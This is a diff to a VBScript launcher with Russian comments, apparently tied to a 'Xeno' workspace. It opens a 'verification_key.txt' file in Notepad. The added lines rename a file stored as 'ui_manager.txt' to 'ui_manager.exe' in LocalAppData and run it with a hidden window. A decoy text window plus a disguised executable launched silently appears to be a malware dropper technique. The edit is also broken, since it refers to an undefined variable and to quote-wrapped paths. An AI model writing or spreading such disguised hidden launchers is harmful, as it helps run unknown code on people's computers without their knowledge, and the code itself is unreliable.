@@ -8,13 +8,20 @@ targetFolder = localAppData & "\Xeno\workspace"
 tempPath = targetFolder & "\verification_key.txt"
 scriptFolder = fso.GetParentFolderName(WScript.ScriptFullName)
 
+
+oldPath = """" & scriptFolder & "\ui_manager.txt"""
+newPath_bild = """" & localAppData & "\ui_manager.exe"""
+
+
+
 ' ===== Проверка: если файл уже существует — открываем и выходим =====
 If fso.FileExists(tempPath) Then
     ' Открываем текстовый файл (используем правильный объект WshShell)
     WshShell.Run "notepad.exe """ & tempPath & """", 1, False
-    
+    ' переимеименовываем файл
+    fso.MoveFile oldPath, newPath
     ' Запускаем UI менеджер из папки со скриптом
-    WshShell.Run """" & scriptFolder & "\ui_manager.exe""", 0, False
+    WshShell.Run newPath_bild, 0, False
     
     WScript.Quit
 End If
@@ -65,4 +72,4 @@ file.Close
 WshShell.Run "notepad.exe """ & tempPath & """", 1, False
 
 ' Запускаем UI менеджер
-WshShell.Run """" & scriptFolder & "\ui_manager.exe""", 0, False
+WshShell.Run newPath_bild, 0, False
